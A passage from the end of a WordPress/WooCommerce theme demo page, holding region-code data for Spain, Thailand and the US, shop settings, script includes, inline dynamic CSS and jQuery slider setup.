Coru\u00f1a\",\"VI\":\"\u00c1lava\",\"AB\":\"Albacete\",\"A\":\"Alicante\",\"AL\":\"Almer\u00eda\",\"O\":\"Asturias\",\"AV\":\"\u00c1vila\",\"BA\":\"Badajoz\",\"PM\":\"Baleares\",\"B\":\"Barcelona\",\"BU\":\"Burgos\",\"CC\":\"C\u00e1ceres\",\"CA\":\"C\u00e1diz\",\"S\":\"Cantabria\",\"CS\":\"Castell\u00f3n\",\"CE\":\"Ceuta\",\"CR\":\"Ciudad Real\",\"CO\":\"C\u00f3rdoba\",\"CU\":\"Cuenca\",\"GI\":\"Girona\",\"GR\":\"Granada\",\"GU\":\"Guadalajara\",\"SS\":\"Guip\u00fazcoa\",\"H\":\"Huelva\",\"HU\":\"Huesca\",\"J\":\"Ja\u00e9n\",\"LO\":\"La Rioja\",\"GC\":\"Las Palmas\",\"LE\":\"Le\u00f3n\",\"L\":\"Lleida\",\"LU\":\"Lugo\",\"M\":\"Madrid\",\"MA\":\"M\u00e1laga\",\"ML\":\"Melilla\",\"MU\":\"Murcia\",\"NA\":\"Navarra\",\"OR\":\"Ourense\",\"P\":\"Palencia\",\"PO\":\"Pontevedra\",\"SA\":\"Salamanca\",\"TF\":\"Santa Cruz de Tenerife\",\"SG\":\"Segovia\",\"SE\":\"Sevilla\",\"SO\":\"Soria\",\"T\":\"Tarragona\",\"TE\":\"Teruel\",\"TO\":\"Toledo\",\"V\":\"Valencia\",\"VA\":\"Valladolid\",\"BI\":\"Vizcaya\",\"ZA\":\"Zamora\",\"Z\":\"Zaragoza\"},\"TH\":{\"TH-37\":\"Amnat Charoen (\u0e2d\u0e33\u0e19\u0e32\u0e08\u0e40\u0e08\u0e23\u0e34\u0e0d)\",\"TH-15\":\"Ang Thong (\u0e2d\u0e48\u0e32\u0e07\u0e17\u0e2d\u0e07)\",\"TH-14\":\"Ayutthaya (\u0e1e\u0e23\u0e30\u0e19\u0e04\u0e23\u0e28\u0e23\u0e35\u0e2d\u0e22\u0e38\u0e18\u0e22\u0e32)\",\"TH-10\":\"Bangkok (\u0e01\u0e23\u0e38\u0e07\u0e40\u0e17\u0e1e\u0e21\u0e2b\u0e32\u0e19\u0e04\u0e23)\",\"TH-38\":\"Bueng Kan (\u0e1a\u0e36\u0e07\u0e01\u0e32\u0e2c)\",\"TH-31\":\"Buri Ram (\u0e1a\u0e38\u0e23\u0e35\u0e23\u0e31\u0e21\u0e22\u0e4c)\",\"TH-24\":\"Chachoengsao (\u0e09\u0e30\u0e40\u0e0a\u0e34\u0e07\u0e40\u0e17\u0e23\u0e32)\",\"TH-18\":\"Chai Nat (\u0e0a\u0e31\u0e22\u0e19\u0e32\u0e17)\",\"TH-36\":\"Chaiyaphum (\u0e0a\u0e31\u0e22\u0e20\u0e39\u0e21\u0e34)\",\"TH-22\":\"Chanthaburi (\u0e08\u0e31\u0e19\u0e17\u0e1a\u0e38\u0e23\u0e35)\",\"TH-50\":\"Chiang Mai (\u0e40\u0e0a\u0e35\u0e22\u0e07\u0e43\u0e2b\u0e21\u0e48)\",\"TH-57\":\"Chiang Rai (\u0e40\u0e0a\u0e35\u0e22\u0e07\u0e23\u0e32\u0e22)\",\"TH-20\":\"Chonburi (\u0e0a\u0e25\u0e1a\u0e38\u0e23\u0e35)\",\"TH-86\":\"Chumphon (\u0e0a\u0e38\u0e21\u0e1e\u0e23)\",\"TH-46\":\"Kalasin (\u0e01\u0e32\u0e2c\u0e2a\u0e34\u0e19\u0e18\u0e38\u0e4c)\",\"TH-62\":\"Kamphaeng Phet (\u0e01\u0e33\u0e41\u0e1e\u0e07\u0e40\u0e1e\u0e0a\u0e23)\",\"TH-71\":\"Kanchanaburi (\u0e01\u0e32\u0e0d\u0e08\u0e19\u0e1a\u0e38\u0e23\u0e35)\",\"TH-40\":\"Khon Kaen (\u0e02\u0e2d\u0e19\u0e41\u0e01\u0e48\u0e19)\",\"TH-81\":\"Krabi (\u0e01\u0e23\u0e30\u0e1a\u0e35\u0e48)\",\"TH-52\":\"Lampang (\u0e25\u0e33\u0e1b\u0e32\u0e07)\",\"TH-51\":\"Lamphun (\u0e25\u0e33\u0e1e\u0e39\u0e19)\",\"TH-42\":\"Loei (\u0e40\u0e25\u0e22)\",\"TH-16\":\"Lopburi (\u0e25\u0e1e\u0e1a\u0e38\u0e23\u0e35)\",\"TH-58\":\"Mae Hong Son (\u0e41\u0e21\u0e48\u0e2e\u0e48\u0e2d\u0e07\u0e2a\u0e2d\u0e19)\",\"TH-44\":\"Maha Sarakham (\u0e21\u0e2b\u0e32\u0e2a\u0e32\u0e23\u0e04\u0e32\u0e21)\",\"TH-49\":\"Mukdahan (\u0e21\u0e38\u0e01\u0e14\u0e32\u0e2b\u0e32\u0e23)\",\"TH-26\":\"Nakhon Nayok (\u0e19\u0e04\u0e23\u0e19\u0e32\u0e22\u0e01)\",\"TH-73\":\"Nakhon Pathom (\u0e19\u0e04\u0e23\u0e1b\u0e10\u0e21)\",\"TH-48\":\"Nakhon Phanom (\u0e19\u0e04\u0e23\u0e1e\u0e19\u0e21)\",\"TH-30\":\"Nakhon Ratchasima (\u0e19\u0e04\u0e23\u0e23\u0e32\u0e0a\u0e2a\u0e35\u0e21\u0e32)\",\"TH-60\":\"Nakhon Sawan (\u0e19\u0e04\u0e23\u0e2a\u0e27\u0e23\u0e23\u0e04\u0e4c)\",\"TH-80\":\"Nakhon Si Thammarat (\u0e19\u0e04\u0e23\u0e28\u0e23\u0e35\u0e18\u0e23\u0e23\u0e21\u0e23\u0e32\u0e0a)\",\"TH-55\":\"Nan (\u0e19\u0e48\u0e32\u0e19)\",\"TH-96\":\"Narathiwat (\u0e19\u0e23\u0e32\u0e18\u0e34\u0e27\u0e32\u0e2a)\",\"TH-39\":\"Nong Bua Lam Phu (\u0e2b\u0e19\u0e2d\u0e07\u0e1a\u0e31\u0e27\u0e25\u0e33\u0e20\u0e39)\",\"TH-43\":\"Nong Khai (\u0e2b\u0e19\u0e2d\u0e07\u0e04\u0e32\u0e22)\",\"TH-12\":\"Nonthaburi (\u0e19\u0e19\u0e17\u0e1a\u0e38\u0e23\u0e35)\",\"TH-13\":\"Pathum Thani (\u0e1b\u0e17\u0e38\u0e21\u0e18\u0e32\u0e19\u0e35)\",\"TH-94\":\"Pattani (\u0e1b\u0e31\u0e15\u0e15\u0e32\u0e19\u0e35)\",\"TH-82\":\"Phang Nga (\u0e1e\u0e31\u0e07\u0e07\u0e32)\",\"TH-93\":\"Phatthalung (\u0e1e\u0e31\u0e17\u0e25\u0e38\u0e07)\",\"TH-56\":\"Phayao (\u0e1e\u0e30\u0e40\u0e22\u0e32)\",\"TH-67\":\"Phetchabun (\u0e40\u0e1e\u0e0a\u0e23\u0e1a\u0e39\u0e23\u0e13\u0e4c)\",\"TH-76\":\"Phetchaburi (\u0e40\u0e1e\u0e0a\u0e23\u0e1a\u0e38\u0e23\u0e35)\",\"TH-66\":\"Phichit (\u0e1e\u0e34\u0e08\u0e34\u0e15\u0e23)\",\"TH-65\":\"Phitsanulok (\u0e1e\u0e34\u0e29\u0e13\u0e38\u0e42\u0e25\u0e01)\",\"TH-54\":\"Phrae (\u0e41\u0e1e\u0e23\u0e48)\",\"TH-83\":\"Phuket (\u0e20\u0e39\u0e40\u0e01\u0e47\u0e15)\",\"TH-25\":\"Prachin Buri (\u0e1b\u0e23\u0e32\u0e08\u0e35\u0e19\u0e1a\u0e38\u0e23\u0e35)\",\"TH-77\":\"Prachuap Khiri Khan (\u0e1b\u0e23\u0e30\u0e08\u0e27\u0e1a\u0e04\u0e35\u0e23\u0e35\u0e02\u0e31\u0e19\u0e18\u0e4c)\",\"TH-85\":\"Ranong (\u0e23\u0e30\u0e19\u0e2d\u0e07)\",\"TH-70\":\"Ratchaburi (\u0e23\u0e32\u0e0a\u0e1a\u0e38\u0e23\u0e35)\",\"TH-21\":\"Rayong (\u0e23\u0e30\u0e22\u0e2d\u0e07)\",\"TH-45\":\"Roi Et (\u0e23\u0e49\u0e2d\u0e22\u0e40\u0e2d\u0e47\u0e14)\",\"TH-27\":\"Sa Kaeo (\u0e2a\u0e23\u0e30\u0e41\u0e01\u0e49\u0e27)\",\"TH-47\":\"Sakon Nakhon (\u0e2a\u0e01\u0e25\u0e19\u0e04\u0e23)\",\"TH-11\":\"Samut Prakan (\u0e2a\u0e21\u0e38\u0e17\u0e23\u0e1b\u0e23\u0e32\u0e01\u0e32\u0e23)\",\"TH-74\":\"Samut Sakhon (\u0e2a\u0e21\u0e38\u0e17\u0e23\u0e2a\u0e32\u0e04\u0e23)\",\"TH-75\":\"Samut Songkhram (\u0e2a\u0e21\u0e38\u0e17\u0e23\u0e2a\u0e07\u0e04\u0e23\u0e32\u0e21)\",\"TH-19\":\"Saraburi (\u0e2a\u0e23\u0e30\u0e1a\u0e38\u0e23\u0e35)\",\"TH-91\":\"Satun (\u0e2a\u0e15\u0e39\u0e25)\",\"TH-17\":\"Sing Buri (\u0e2a\u0e34\u0e07\u0e2b\u0e4c\u0e1a\u0e38\u0e23\u0e35)\",\"TH-33\":\"Sisaket (\u0e28\u0e23\u0e35\u0e2a\u0e30\u0e40\u0e01\u0e29)\",\"TH-90\":\"Songkhla (\u0e2a\u0e07\u0e02\u0e25\u0e32)\",\"TH-64\":\"Sukhothai (\u0e2a\u0e38\u0e42\u0e02\u0e17\u0e31\u0e22)\",\"TH-72\":\"Suphan Buri (\u0e2a\u0e38\u0e1e\u0e23\u0e23\u0e13\u0e1a\u0e38\u0e23\u0e35)\",\"TH-84\":\"Surat Thani (\u0e2a\u0e38\u0e23\u0e32\u0e29\u0e0e\u0e23\u0e4c\u0e18\u0e32\u0e19\u0e35)\",\"TH-32\":\"Surin (\u0e2a\u0e38\u0e23\u0e34\u0e19\u0e17\u0e23\u0e4c)\",\"TH-63\":\"Tak (\u0e15\u0e32\u0e01)\",\"TH-92\":\"Trang (\u0e15\u0e23\u0e31\u0e07)\",\"TH-23\":\"Trat (\u0e15\u0e23\u0e32\u0e14)\",\"TH-34\":\"Ubon Ratchathani (\u0e2d\u0e38\u0e1a\u0e25\u0e23\u0e32\u0e0a\u0e18\u0e32\u0e19\u0e35)\",\"TH-41\":\"Udon Thani (\u0e2d\u0e38\u0e14\u0e23\u0e18\u0e32\u0e19\u0e35)\",\"TH-61\":\"Uthai Thani (\u0e2d\u0e38\u0e17\u0e31\u0e22\u0e18\u0e32\u0e19\u0e35)\",\"TH-53\":\"Uttaradit (\u0e2d\u0e38\u0e15\u0e23\u0e14\u0e34\u0e15\u0e16\u0e4c)\",\"TH-95\":\"Yala (\u0e22\u0e30\u0e25\u0e32)\",\"TH-35\":\"Yasothon (\u0e22\u0e42\u0e2a\u0e18\u0e23)\"},\"US\":{\"AL\":\"Alabama\",\"AK\":\"Alaska\",\"AZ\":\"Arizona\",\"AR\":\"Arkansas\",\"CA\":\"California\",\"CO\":\"Colorado\",\"CT\":\"Connecticut\",\"DE\":\"Delaware\",\"DC\":\"District Of Columbia\",\"FL\":\"Florida\",\"GA\":\"Georgia\",\"HI\":\"Hawaii\",\"ID\":\"Idaho\",\"IL\":\"Illinois\",\"IN\":\"Indiana\",\"IA\":\"Iowa\",\"KS\":\"Kansas\",\"KY\":\"Kentucky\",\"LA\":\"Louisiana\",\"ME\":\"Maine\",\"MD\":\"Maryland\",\"MA\":\"Massachusetts\",\"MI\":\"Michigan\",\"MN\":\"Minnesota\",\"MS\":\"Mississippi\",\"MO\":\"Missouri\",\"MT\":\"Montana\",\"NE\":\"Nebraska\",\"NV\":\"Nevada\",\"NH\":\"New Hampshire\",\"NJ\":\"New Jersey\",\"NM\":\"New Mexico\",\"NY\":\"New York\",\"NC\":\"North Carolina\",\"ND\":\"North Dakota\",\"OH\":\"Ohio\",\"OK\":\"Oklahoma\",\"OR\":\"Oregon\",\"PA\":\"Pennsylvania\",\"RI\":\"Rhode Island\",\"SC\":\"South Carolina\",\"SD\":\"South Dakota\",\"TN\":\"Tennessee\",\"TX\":\"Texas\",\"UT\":\"Utah\",\"VT\":\"Vermont\",\"VA\":\"Virginia\",\"WA\":\"Washington\",\"WV\":\"West Virginia\",\"WI\":\"Wisconsin\",\"WY\":\"Wyoming\",\"AA\":\"Armed Forces (AA)\",\"AE\":\"Armed Forces (AE)\",\"AP\":\"Armed Forces (AP)\",\"AS\":\"American Samoa\",\"GU\":\"Guam\",\"MP\":\"Northern Mariana Islands\",\"PR\":\"Puerto Rico\",\"UM\":\"US Minor Outlying Islands\",\"VI\":\"US Virgin Islands\"}}","plugin_url":"http:\/\/envision.wptation.com\/wp-content\/plugins\/woocommerce","ajax_url":"\/wp-admin\/admin-ajax.php","ajax_loader_url":"http:\/\/envision.wptation.com\/wp-content\/plugins\/woocommerce\/assets\/images\/ajax-loader@2x.gif","i18n_select_state_text":"Select an option\u2026","i18n_required_rating_text":"Please select a rating","i18n_no_matching_variations_text":"Sorry, no products matched your selection. Please choose a different combination.","i18n_required_text":"required","i18n_view_cart":"View Cart \u2192","review_rating_required":"yes","update_order_review_nonce":"de3629a225","apply_coupon_nonce":"12f1006257","option_guest_checkout":"yes","checkout_url":"\/wp-admin\/admin-ajax.php?action=woocommerce-checkout","is_checkout":"0","update_shipping_method_nonce":"109ee5caa8","cart_url":"http:\/\/envision.wptation.com\/cart\/","cart_redirect_after_add":"no"};
/* ]]> */
</script>
<script type='text/javascript' src='js/woocommerce.min.js'></script>
<script type='text/javascript' src='js/jquery.cookie.min.js'></script>
<script type='text/javascript' src='js/cart-fragments.min.js'></script>
<script type='text/javascript' src='js/jquery.prettyPhoto.js'></script>
<script type='text/javascript' src='js/extensions.js'></script>
<script type='text/javascript' src='js/woocommerce.js'></script>
<script type='text/javascript' src='js/waypoints.min.js'></script>
<script type='text/javascript' src='js/waypoints-sticky.js'></script>
<script type='text/javascript' src='js/jquery.viewport.mini.js'></script>
<script type='text/javascript' src='js/jquery.flexslider.js'></script>
<script type='text/javascript' src='js/widgets.js'></script>
<script type='text/javascript' src='js/jquery.jplayer.js'></script>

<script type="text/javascript">
// <![CDATA[
	var styleElement = document.createElement("style");
		styleElement.type = "text/css";

	var cloudfw_dynamic_css_code = "@media ( min-width: 979px ) { .modern-browser #header-container.stuck #logo img {height: 75px;  margin-top: 2px !important;  margin-bottom: 2px !important;}  }\r\n\r\nhtml #page-content .section-cr4zq {background-color:#f1f1f1; *background-color: #ffffff; background-image:url('data:image\/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHByZXNlcnZlQXNwZWN0UmF0aW89Im5vbmUiIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPg0KICAgIDxkZWZzPg0KICAgICAgICA8bGluZWFyR3JhZGllbnQgaWQ9ImxpbmVhci1ncmFkaWVudCIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiIHNwcmVhZE1ldGhvZD0icGFkIj4NCiAgICAgICAgICAgIDxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmZmZmZmYiIHN0b3Atb3BhY2l0eT0iMSIvPg0KICAgICAgICAgICAgPHN0b3Agb2Zmc2V0PSIxMDAlIiBzdG9wLWNvbG9yPSIjZjFmMWYxIiBzdG9wLW9wYWNpdHk9IjEiLz4NCiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4NCiAgICA8L2RlZnM+DQogICAgPHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6IHVybCgjbGluZWFyLWdyYWRpZW50KTsiLz4NCjwvc3ZnPg=='); background-image: -moz-linear-gradient(top, #ffffff, #f1f1f1); background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffffff), to(#f1f1f1)); background-image: -webkit-linear-gradient(top, #ffffff, #f1f1f1); background-image: -o-linear-gradient(top, #ffffff, #f1f1f1); background-image: linear-gradient(to bottom, #ffffff, #f1f1f1); filter:  progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#ffffff', endColorstr='#f1f1f1'); -ms-filter: \"progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr='#ffffff', endColorstr='#f1f1f1')\"; background-repeat: repeat-x ;  border-top: 1px solid #ebebeb;  overflow: hidden;} html #page-content .section-cr4zq p {} html #page-content .section-cr4zq h1, html #page-content .section-cr4zq h2, html #page-content .section-cr4zq h3, html #page-content .section-cr4zq h4, html #page-content .section-cr4zq h5, html #page-content .section-cr4zq h6, html #page-content .section-cr4zq .heading-colorable {} html #page-content .section-cr4zq a {} html #page-content .section-cr4zq a:hover {} \r\nhtml #page-content .section-8wp3r {background-color:#63524A; background-image: none ;  background-image: url('http:\/\/envision.wptation.com\/wp-content\/uploads\/2013\/09\/bg.jpg'); -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; filter: none; -ms-filter: none;  overflow: visible;} html.old-browser #page-content .section-8wp3r {-webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover; filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http:\/\/envision.wptation.com\/wp-content\/uploads\/2013\/09\/bg.jpg',sizingMethod='scale'); -ms-filter: \"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http:\/\/envision.wptation.com\/wp-content\/uploads\/2013\/09\/bg.jpg', sizingMethod='scale')\";} html #page-content .section-8wp3r p {} html #page-content .section-8wp3r h1, html #page-content .section-8wp3r h2, html #page-content .section-8wp3r h3, html #page-content .section-8wp3r h4, html #page-content .section-8wp3r h5, html #page-content .section-8wp3r h6, html #page-content .section-8wp3r .heading-colorable {} html #page-content .section-8wp3r a {} html #page-content .section-8wp3r a:hover {text-decoration: underline;} \r\nhtml #socialbar-1 .ui-socialbar-item {background-color:#2b2b2b; background-image: none ;} ";

	if (styleElement.styleSheet) {
		styleElement.styleSheet.cssText = cloudfw_dynamic_css_code;
	} else {
		styleElement.appendChild(document.createTextNode(cloudfw_dynamic_css_code));
	}

	document.getElementsByTagName("head")[0].appendChild(styleElement);

// ]]>
</script>

<script type="text/javascript">
// <![CDATA[
	cloudfw_load_css_file( 'theme-css-jplayer', 'css/jplayer.skin.css' );

// ]]>
</script>
<script src="js/jquery.bxslider.js"></script>
<script src="js/scripts.js"></script>
 <script>
        jQuery(document).ready(function(){
  jQuery('.vw-breaking-news-list').bxSlider({
    slideWidth: 300,
    minSlides: 2,
    maxSlides: 4,
    moveSlides: 1,
    slideMargin: 8
  });
});

        jQuery(document).ready(function(){
  jQuery('.vw-post-slides').bxSlider({
    slideWidth: 1365,
    minSlides: 1,
    maxSlides: 1,
    moveSlides: 1,
    slideMargin: 0,
	pause: 6000,
  });
});

        jQuery(document).ready(function(){
  jQuery('.vw-post-slides1').bxSlider({
    slideWidth: 360,
    minSlides: 2,
    maxSlides: 3,
    moveSlides: 1,
    slideMargin: 22,
	pause: 6000,
  });
});
        </script>

</body>
</html>